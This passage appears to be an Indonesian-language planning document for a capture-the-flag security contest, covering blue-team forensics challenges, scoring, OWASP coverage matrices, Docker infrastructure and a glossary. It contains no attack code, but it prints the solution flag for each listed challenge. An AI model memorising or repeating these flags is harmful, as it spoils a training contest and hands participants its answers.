| **File**             | `capture.pcap`                                               |
| **Tags**             | network-forensics, pcap, ssrf-detection                      |

#### BLU-04: PCAP Detective — Data Exfiltration

| Item         | Detail                                                              |
| ------------ | ------------------------------------------------------------------- |
| **Level**    | Medium                                                              |
| **Poin**     | 200                                                                 |
| **Skenario** | Deteksi DNS tunneling dalam PCAP. Temukan data yang di-exfiltrated. |
| **Flag**     | `puti{dns_tunn3l_d3t3ct3d}`                                         |
| **Tags**     | network-forensics, dns-tunneling, data-exfiltration                 |

#### BLU-05: SIEM Alert Correlation

| Item         | Detail                                                           |
| ------------ | ---------------------------------------------------------------- |
| **Level**    | Medium                                                           |
| **Poin**     | 250                                                              |
| **Skenario** | 100 SIEM alerts. Identifikasi 5 true positive vs false positive. |
| **Flag**     | `puti{siem_c0rr3l4t10n_m4st3r}`                                  |
| **File**     | `siem_alerts.csv`                                                |
| **Tags**     | siem, alert-correlation, blue-team                               |

#### BLU-06: Config Hardening

| Item                 | Detail                                                                  |
| -------------------- | ----------------------------------------------------------------------- |
| **Level**            | Beginner                                                                |
| **Poin**             | 100                                                                     |
| **Serangan Terkait** | RED-02 (Config Slip)                                                    |
| **Skenario**         | File `nginx.conf` memiliki 5 misconfiguration. Identifikasi dan report. |
| **Flag**             | `puti{h4rd3n_y0ur_c0nf1g}`                                              |
| **File**             | `nginx.conf`, `my.cnf`                                                  |
| **Tags**             | hardening, misconfiguration, blue-team                                  |

#### BLU-07: Incident Responder

| Item         | Detail                                                                             |
| ------------ | ---------------------------------------------------------------------------------- |
| **Level**    | Hard                                                                               |
| **Poin**     | 350                                                                                |
| **Skenario** | Multiple log files (auth.log, access.log, syslog). Buat timeline serangan lengkap. |
| **Flag**     | `puti{1nc1d3nt_t1m3l1n3_20260708}`                                                 |
| **File**     | Bundle log (.tar.gz)                                                               |
| **Tags**     | incident-response, timeline, forensics                                             |

#### BLU-08: Threat Intelligence — IOC Correlation

| Item         | Detail                                                   |
| ------------ | -------------------------------------------------------- |
| **Level**    | Medium                                                   |
| **Poin**     | 200                                                      |
| **Skenario** | IOC list (IP, domains, hashes). Cari korelasi antar IOC. |
| **Flag**     | `puti{thr34t_1nt3l_c0rr3l4t10n}`                         |
| **File**     | `ioc_list.csv`                                           |
| **Tags**     | threat-intelligence, ioc-correlation, cti                |

---

## 7. Scoring Distribution

| Level                     | Red Team          | API Security     | WordPress         | Blue Team        | Total              |
| ------------------------- | ----------------- | ---------------- | ----------------- | ---------------- | ------------------ |
| **Beginner** (100-150pts) | 3 (350pts)        | —                | 5 (700pts)        | 3 (300pts)       | 11 (1,350pts)      |
| **Medium** (200-300pts)   | 11 (2,550pts)     | 4 (850pts)       | 4 (1,050pts)      | 4 (850pts)       | 23 (5,300pts)      |
| **Hard** (300-400pts)     | 8 (2,350pts)      | 2 (600pts)       | 2 (600pts)        | 1 (350pts)       | 13 (3,900pts)      |
| **Total**                 | **22 (5,250pts)** | **6 (1,450pts)** | **11 (2,350pts)** | **8 (1,500pts)** | **47 (10,550pts)** |

---

## 8. OWASP Coverage Matrix

### OWASP Top 10 (2021)

| Rank    | Category                  | Status | Challenges                                                    |
| ------- | ------------------------- | ------ | ------------------------------------------------------------- |
| **A01** | Broken Access Control     | ✅     | RED-06 (IDOR), RED-07 (CSRF), RED-18 (BAC), API-01 (BOLA)     |
| **A02** | Cryptographic Failures    | 🔲     | (Belum ada)                                                   |
| **A03** | Injection                 | ✅     | RED-08/09/10 (SQLi), RED-11/12/13 (XSS), RED-15 (SSTI)        |
| **A04** | Insecure Design           | 🔲     | (Belum ada)                                                   |
| **A05** | Security Misconfiguration | ✅     | RED-02 (Config Slip), RED-16 (XXE), RED-19/20/21/22 (Headers) |
| **A06** | Vulnerable Components     | 🔲     | (Belum ada)                                                   |
| **A07** | Auth Failures             | ✅     | RED-03 (Broken Auth), RED-04 (JWT), RED-05 (Session Fix)      |
| **A08** | Software Integrity        | 🔲     | (Belum ada)                                                   |
| **A09** | Security Monitoring       | ✅     | BLU-01 s.d. BLU-08 (Blue Team)                                |
| **A10** | SSRF                      | ✅     | RED-14 (SSRF), WP-02 (XML-RPC SSRF)                           |

### OWASP API Top 10

| Rank      | Category                   | Status | Challenges |
| --------- | -------------------------- | ------ | ---------- |
| **API1**  | BOLA                       | ✅     | API-01     |
| **API2**  | Broken Auth                | 🔲     | —          |
| **API3**  | Excessive Data Exposure    | ✅     | API-02     |
| **API4**  | Rate Limiting              | 🔲     | —          |
| **API5**  | BFLA                       | ✅     | API-04     |
| **API6**  | Mass Assignment            | ✅     | API-03     |
| **API7**  | Security Misconfiguration  | 🔲     | —          |
| **API8**  | Injection                  | 🔲     | —          |
| **API9**  | Improper Assets Management | ✅     | API-05     |
| **API10** | Logging & Monitoring       | 🔲     | —          |

### WSTG Coverage

| WSTG Phase                     | Status | Challenges                                                           |
| ------------------------------ | ------ | -------------------------------------------------------------------- |
| **INFO** Information Gathering | ✅     | RED-01                                                               |
| **CONF** Configuration Testing | ✅     | RED-02, RED-19/20/21/22                                              |
| **ATHN** Authentication        | ✅     | RED-03, RED-04, RED-05                                               |
| **ATHZ** Authorization         | ✅     | RED-06, RED-18                                                       |
| **SESN** Session Management    | ✅     | RED-04, RED-05, RED-07                                               |
| **INPV** Input Validation      | ✅     | RED-08/09/10 (SQLi), RED-11/12/13 (XSS), RED-15 (SSTI), RED-16 (XXE) |
| **CLNT** Client-side Testing   | ✅     | RED-13 (DOM XSS), RED-22 (CORS)                                      |
| **ERR** Error Handling         | 🔲     | —                                                                    |
| **CRYP** Cryptography          | 🔲     | —                                                                    |
| **BUS** Business Logic         | 🔲     | —                                                                    |
| **API** API Testing            | ✅     | API-01 s.d. API-06                                                   |

---

## 9. Infrastructure Requirements

### Docker Containers

| Container        | Challenges                            | Port | Base Image               |
| ---------------- | ------------------------------------- | ---- | ------------------------ |
| `ctf-web-recon`  | RED-01 (Hidden Recon)                 | 8101 | nginx:alpine             |
| `ctf-web-config` | RED-02 (Config Slip)                  | 8102 | python:3.11-slim         |
| `ctf-web-auth`   | RED-03, 04, 05, 06, 07                | 8103 | python:3.11-slim         |
| `ctf-web-bac`    | RED-18 (BAC Multi-layer)              | 8104 | python:3.11-slim         |
| `ctf-sqli-1`     | RED-08 (UNION SQLi)                   | 8201 | python:3.11-slim         |
| `ctf-sqli-2`     | RED-09 (Blind Boolean)                | 8202 | python:3.11-slim         |
| `ctf-sqli-3`     | RED-10 (Time Based)                   | 8203 | python:3.11-slim         |
| `ctf-xss-1`      | RED-11 (Reflected XSS) + Bot          | 8301 | python:3.11-slim         |
| `ctf-xss-2`      | RED-12 (Stored XSS) + Bot             | 8302 | python:3.11-slim         |
| `ctf-xss-3`      | RED-13 (DOM XSS)                      | 8303 | nginx:alpine             |
| `ctf-web-adv`    | RED-14, 15, 16 (SSRF, SSTI, XXE)      | 8401 | python:3.11-slim         |
| `ctf-headers`    | RED-19, 20, 21, 22 (Security Headers) | 8402 | nginx:alpine             |
| `ctf-api`        | API-01 s.d. API-06                    | 8501 | python:3.11-slim         |
| `ctf-wordpress`  | WP-01 s.d. WP-11                      | 8601 | wordpress:6 + mariadb    |
| `ctf-bot`        | XSS bot service                       | 8701 | node:20-slim (Puppeteer) |

### File Attachments

| Challenge | File                             | Format              |
| --------- | -------------------------------- | ------------------- |
| BLU-01    | `access.log`                     | Text (10.000 baris) |
| BLU-02    | `access.log` (XSS variant)       | Text                |
| BLU-03    | `capture.pcap`                   | PCAP                |
| BLU-04    | `capture_dns.pcap`               | PCAP                |
| BLU-05    | `siem_alerts.csv`                | CSV                 |
| BLU-06    | `nginx.conf`, `my.cnf`, `app.py` | Config files        |
| BLU-07    | Log bundle (`.tar.gz`)           | Archive             |
| BLU-08    | `ioc_list.csv`                   | CSV                 |

---

## 10. Glossary

| Term          | Definisi                                                                          |
| ------------- | --------------------------------------------------------------------------------- |
| **BAC**       | Broken Access Control — kegagalan pembatasan akses                                |
| **BFLA**      | Broken Function Level Authorization — akses fungsi terbatas                       |
| **BOLA**      | Broken Object Level Authorization — akses object milik user lain                  |
| **CORS**      | Cross-Origin Resource Sharing — kebijakan berbagi sumber daya lintas origin       |
| **CSP**       | Content Security Policy — kebijakan keamanan konten                               |
| **CSRF**      | Cross-Site Request Forgery — pemalsuan request lintas situs                       |
| **IDOR**      | Insecure Direct Object Reference — referensi langsung objek tanpa otorisasi       |
| **JWT**       | JSON Web Token — token autentikasi berbasis JSON                                  |
| **LFI**       | Local File Inclusion — penyertaan file lokal                                      |
| **POP Chain** | Property-Oriented Programming — rantai properti untuk eksploitasi deserialization |
| **SSTI**      | Server-Side Template Injection — injeksi template sisi server                     |
| **SSRF**      | Server-Side Request Forgery — pemalsuan request sisi server                       |
| **WSTG**      | Web Security Testing Guide — panduan pengujian keamanan web OWASP                 |
| **XSS**       | Cross-Site Scripting — skrip lintas situs                                         |
| **XXE**       | XML External Entity — entitas eksternal XML                                       |

---

## 11. Dokumen Terkait

| Dokumen              | Path                                             |
| -------------------- | ------------------------------------------------ |
| API Contract         | `docs/refactor/API_CONTRACT.md`                  |
| Frontend Style Guide | `.opencode/skills/ctfd-frontend-design/SKILL.md` |
| OWASP WSTG Skill     | `~/.config/opencode/skills/owasp/SKILL.md`       |
| CTFd Deployment      | `docker-compose.yml`                             |
| Nginx Config         | `conf/nginx/http.conf`                           |
